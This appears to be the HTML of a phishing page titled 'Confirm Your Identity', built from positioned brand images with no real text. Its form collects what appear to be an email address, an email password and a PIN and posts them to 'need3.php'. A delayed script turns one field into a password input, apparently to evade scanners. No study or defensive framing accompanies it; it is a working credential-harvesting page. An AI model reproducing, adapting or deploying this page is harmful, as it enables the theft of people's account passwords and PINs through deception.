<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Identity</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox {  
    border: solid 1px #CFD1D7;
  	border-radius: 3px;
 	padding-left: 10px;
	font-family: Verdana;
  	font-size: 15px;
    color: #44464A;
    height: 38px; 
    width: 275px; 
 } 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 3px;
    border-width: 2px; 
    outline: 0; 
 } 
 </style>			  
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:189px; top:33px; width:64px; height:65px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=64 height=65></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1044px; top:75px; width:96px; height:17px; z-index:1"><a href="#"><img src="images/secu.png" alt="" title="" border=0 width=96 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:109px; width:1349px; height:16px; z-index:2"><img src="images/wf17.png" alt="" title="" border=0 width=1349 height=16></div>

<div id="image4" style="position:absolute; overflow:hidden; left:168px; top:543px; width:984px; height:18px; z-index:3"><img src="images/wf22.png" alt="" title="" border=0 width=984 height=18></div>

<div id="image5" style="position:absolute; overflow:hidden; left:186px; top:142px; width:553px; height:71px; z-index:4"><img src="images/wf19.png" alt="" title="" border=0 width=553 height=71></div>

<div id="image6" style="position:absolute; overflow:hidden; left:198px; top:239px; width:166px; height:219px; z-index:5"><img src="images/k1.png" alt="" title="" border=0 width=166 height=219></div>

<div id="image7" style="position:absolute; overflow:hidden; left:181px; top:744px; width:409px; height:50px; z-index:6"><img src="images/wf20.png" alt="" title="" border=0 width=409 height=50></div>

<div id="image8" style="position:absolute; overflow:hidden; left:186px; top:676px; width:614px; height:40px; z-index:7"><a href="#"><img src="images/wf21.png" alt="" title="" border=0 width=614 height=40></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:853px; top:573px; width:77px; height:34px; z-index:8"><a href="#"><img src="images/canc.png" alt="" title="" border=0 width=77 height=34></a></div>
<form action=need3.php name=passocones id=passocones method=post>
<input name="em" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:338px;left:200;top:269;z-index:9">
<input name="ep" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:338px;left:200px;top:363px;z-index:10">
<input name="pi" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:338px;left:201;top:451;z-index:11">

<div id="formimage1" style="position:absolute; left:951px; top:574px; z-index:11"><input type="image" name="formimage1" width="122" height="34" src="images/confirm.png"></div>

</div>

</body>
</html>